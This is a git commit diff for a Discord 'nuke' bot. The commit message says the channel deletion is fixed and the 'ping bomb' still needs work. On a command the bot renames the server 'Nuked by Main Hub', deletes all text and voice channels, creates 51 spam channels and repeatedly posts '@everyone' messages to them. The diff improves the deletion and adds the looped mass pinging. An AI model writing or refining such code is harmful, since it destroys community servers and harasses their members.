1e5dd8b87c7cd4c4ff3033088a419b847b728aae
book <61812799+dumbstuffified@users.noreply.github.com>
2022-07-30 12:07:47 -0400

    delete channels fixed, need to work on ping bomb

--- index.js
+++ index.js
@@ -5,17 +5,6 @@ const client = new Client({intents: GatewayIntentBits.Guilds});
 client.once('ready', () =>{
   console.log('Ready!')
 })
-//   function channelbomb(i){
-//   i.guild.channels.create('nuked-by-mh', {
-//         type: "text", //This create a text channel, you can make a voice one too, by changing "text" to "voice"
-//         permissionOverwrites: [
-//            {
-//              id: i.guild.roles.everyone, //To make it be seen by a certain role, user an ID instead
-//              allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'] //Allow permissions
-// 		   }
-//         ],
-//       })
-// }
   
 
 
@@ -28,18 +17,21 @@ client.on('interactionCreate', async interaction => {
 		await interaction.reply('trololol')
     await interaction.guild.setName('Nuked by Main Hub');
     interaction.guild.channels.cache.each(async (c) =>{
-        if(c.type = ChannelType.GuildText) {
-            c.delete();
+        if(c.type == ChannelType.GuildText || c.type == ChannelType.GuildVoice){
+          c.delete();
         }
     })
     for (var i = 0; i < 51; i++) {
       interaction.guild.channels.create({ name: 'nuked-by-mh', reason: 'L' })
     }
-    interaction.guild.channels.cache.each(async (c) =>{
+    for (var i = 0; i < 51; i++) {
+      interaction.guild.channels.cache.each(async (c) =>{
         if(c.type = ChannelType.GuildText) {
             c.send('NUKED BY MAIN HUB @everyone')
         }
     })
+    }
+    
     
     
   }
